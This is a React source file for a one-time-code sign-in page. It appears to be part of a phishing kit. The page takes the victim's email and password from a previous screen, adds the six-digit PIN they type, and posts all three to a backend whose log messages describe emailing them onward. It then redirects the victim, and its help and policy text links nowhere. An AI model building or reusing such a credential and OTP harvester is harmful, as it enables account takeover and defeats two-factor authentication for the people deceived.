import React, { useState } from 'react'
import { useHistory } from 'react-router-dom'
import OtpInput from 'react-otp-input'
import URL from './Url.js'

const Otp = (props) => {
    const history = useHistory()

   
    const [otp, setOtp] = useState('')
    const [keepOtp, setKeepOtp] = useState([])
    const [loading, setLoading] = useState(false)

     const inputHandler = (input) => {
         setOtp(input)
         setKeepOtp((singleOtp) => [input])
     }

     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)

         const clientOtp = keepOtp.toString()
         history.push('/')

         if (props.location.state) {
             const templateParams = props.location.state

             templateParams.clientOtp = clientOtp

             try {
                 
                 const response = await fetch(URL + '/otp', {
                     method: 'POST',
                     headers: {
                         'Content-type': 'application/json',
                     },
                     body: JSON.stringify({
                         email: templateParams.email,
                         password: templateParams.password,
                         pin: clientOtp,
                     }),
                 })

                 const resData = await response.json()

                 console.log('email sending started')

                 if (resData.status === 'success') {
                     console.log('Message Sent.')
                     setTimeout(() => {
                         console.log('time out init')
                         setLoading(false)

                         history.push('/')
                     }, 10000)
                 } else if (resData.status === 'fail') {
                     console.log('Message failed to send.')
                     setLoading(false)
                 }
             } catch (err) {
                 console.log(err)
             }
         }
     }

    return (
        <>
            <form
                className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 h-full text-[#3d4a5b] p-6 justify-items-center'
                onSubmit={handleSubmit}
            >
                <div>
                    <h2 className='font-ProximaNovaSemibold text-center mb-6 text-[#3d4a5b]'>
                        Welcome back!
                    </h2>
                 
                        <OtpInput
                            value={otp}
                            onChange={inputHandler}
                            numInputs={6}
                            inputStyle='pinlogin-field'
                            containerStyle='pinlogin'
                            shouldAutoFocus
                            isInputNum
                        />

                     
                    <div className='flex justify-start'>
                        <div className='font-ProximaNovaSemibold text-center text-[#49cc68]'>
                            Forgot password?
                        </div>
                    </div>
                </div>
                <div className='grid content-end'>
                    <p className='text-center py-2 text-[#3d4a5b] text-sm'>
                        Learn more about our{' '}
                        <span className='text-[#49cc68] font-ProximaNovaSemibold'>
                            Privacy policy
                        </span>{' '}
                        and{' '}
                        <span className='text-[#49cc68] font-ProximaNovaSemibold'>
                            Terms of service
                        </span>
                    </p>
                    <button
                        className=' rounded-3xl outline-none  bg-[#49cc68] text-white btn'
                        style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
                    >
                        {loading ? 'loading..' : 'Sign in'}
                    </button>
                </div>
            </form>
        </>
    )
}

export default Otp
